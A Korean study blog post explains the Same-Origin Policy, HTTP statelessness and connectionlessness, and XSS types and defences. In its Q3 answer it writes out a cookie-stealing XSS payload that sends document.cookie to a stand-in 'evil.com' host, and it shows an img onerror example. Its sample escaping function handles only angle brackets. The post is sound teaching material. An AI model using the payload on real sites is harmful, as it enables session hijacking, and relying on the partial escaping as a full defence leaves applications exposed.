---
layout: post
title: "HTTP & 웹 보안: SOP, Stateless/Connectionless, XSS 완전 가이드"
date: 2025-07-25 14:30:00 +0900
categories: [CS, Network]
tags: [HTTP, 웹보안, SOP, Stateless, Connectionless, XSS, CORS, 네트워크]
---

# HTTP & 웹 보안: SOP, Stateless/Connectionless, XSS 완전 가이드

## 🎯 학습 목표 및 전체 구조

### **핵심 주제**
- **15번: SOP 정책**
- **16번: Stateless와 Connectionless** 
- **21번: XSS**

### **주제 간 연관성**
```
웹 보안의 3단계 방어체계
├── 1단계: SOP (브라우저 레벨 보안)
├── 2단계: HTTP 특성 (프로토콜 레벨 특성)
└── 3단계: XSS 방어 (애플리케이션 레벨 보안)
```

---

## 1️⃣ SOP (Same-Origin Policy) 정책

### 📋 핵심 개념
**SOP(Same-Origin Policy)**는 브라우저의 보안 정책으로, **같은 출처(Origin)의 리소스만 접근** 가능합니다.

**Origin 구성**: `Protocol + Domain + Port`

### ✅ SOP 적용 예시

| 원본 사이트 | 접근 사이트 | 허용 여부 | 이유 |
|------------|------------|----------|------|
| https://bank.com | https://bank.com/user | ✅ 허용 | 동일 Origin |
| https://bank.com | http://bank.com | ❌ 차단 | Protocol 다름 |
| https://bank.com | https://evil.com | ❌ 차단 | Domain 다름 |

### 🔧 우회 방법
- **CORS**: `Access-Control-Allow-Origin` 헤더 설정
- **JSONP**: `<script>` 태그 활용

---

## 2️⃣ Stateless와 Connectionless

### 📋 Stateless (무상태성)
**서버가 이전 요청의 상태를 기억하지 않음**

```
편의점 알바생 (Stateless 서버)
고객: "콜라 주세요" → 알바: "1500원입니다"
고객: "과자도 주세요" → 알바: "누구세요?"
```

### 📋 Connectionless (비연결성)
**요청-응답 후 연결 즉시 종료**

```
HTTP: 요청 → 응답 → 연결 끊음 → 새 요청 → 응답 → 연결 끊음
전화: 연결 → 대화 → 대화 → 대화 → 끊음
```

### 🔧 해결 방법
- **쿠키/세션**: 상태 정보 저장
- **Keep-Alive**: 연결 재사용

---

## 3️⃣ XSS (Cross-Site Scripting)

### 📋 XSS 유형
1. **Stored XSS**: DB에 저장된 악성 스크립트
2. **Reflected XSS**: URL 파라미터 통한 공격
3. **DOM-based XSS**: JavaScript DOM 조작시 발생

### 🛡️ 방어 방법
```javascript
// 1. 입력값 이스케이프
function escapeHtml(text) {
  return text.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// 2. CSP 설정
Content-Security-Policy: script-src 'self'

// 3. HttpOnly 쿠키
Set-Cookie: sessionId=abc123; HttpOnly; Secure
```

---

## 🔗 개념 간 연관성

```
웹 보안 통합 모델
├── SOP: Origin 기반 1차 차단
├── HTTP 특성: Stateless로 세션 관리 복잡화
└── XSS: 애플리케이션 레벨 스크립트 공격 방어
```

---

## 📝 실무 예제 (압축버전)

### 예제 1: 쇼핑몰 시스템
- **SOP**: `fetch('https://bank.com/api')` → CORS 에러
- **Stateless**: 매 요청시 쿠키로 사용자 확인
- **XSS**: 상품 리뷰에 `<script>` 태그 삽입 공격

### 예제 2: 소셜미디어
- **SOP**: 다른 사이트 쿠키 접근 차단
- **Connectionless**: 댓글 작성 → 응답 → 연결 종료
- **XSS**: `<img onerror='alert("공격")'>` 형태 공격

### 예제 3: 온라인 뱅킹
- **SOP**: iframe 접근 차단으로 보안 강화
- **Stateless**: JWT 토큰으로 거래 인증
- **XSS**: 쿠키 탈취로 계좌 정보 유출 위험

---

## 🔥 핵심 질문 5가지 (요약버전)

### Q1: CORS 에러 해결
**문제**: 다른 도메인 API 호출시 에러
**해결**: 서버에서 CORS 헤더 설정
```javascript
res.header('Access-Control-Allow-Origin', 'https://myapp.com');
```

### Q2: 로그인 상태 유지
**문제**: HTTP Stateless 특성
**해결**: 쿠키/세션 또는 JWT 토큰 사용
```javascript
// 세션 방식
Set-Cookie: sessionId=abc123; HttpOnly
// JWT 방식  
Authorization: Bearer eyJhbGci...
```

### Q3: XSS 공격 방어
**공격**: `<script>fetch('evil.com?cookie='+document.cookie)</script>`
**방어**: 입력값 이스케이프 + CSP + HttpOnly 쿠키

### Q4: API 성능 최적화
**문제**: 매번 새 연결로 인한 지연
**해결**: Keep-Alive, 요청 배치처리, 캐싱

### Q5: 브라우저 보안 강화
**SOP 한계**: 클릭재킹, XSS 우회
**추가 보안**: CSP, X-Frame-Options, SameSite 쿠키

---

## 📋 핵심 키워드

### **SOP 관련**
- **Same-Origin Policy**, **Origin**, **CORS**, **JSONP**

### **HTTP 특성 관련**  
- **Stateless**, **Connectionless**, **Keep-Alive**, **세션 관리**

### **XSS 관련**
- **Cross-Site Scripting**, **Stored/Reflected/DOM-based XSS**, **CSP**, **HttpOnly**

---

## 🎓 학습 성과

이 세 개념은 **웹 보안의 다층 방어체계**를 구성합니다:

1. **SOP**: 브라우저 레벨에서 Origin 기반 접근 제어
2. **HTTP 특성**: 프로토콜 레벨에서 무상태/비연결 특성으로 인한 복잡성
3. **XSS 방어**: 애플리케이션 레벨에서 스크립트 공격 차단

**실무 적용**: CORS 설정, 안전한 세션 관리, XSS 방어 코드 작성 능력 확보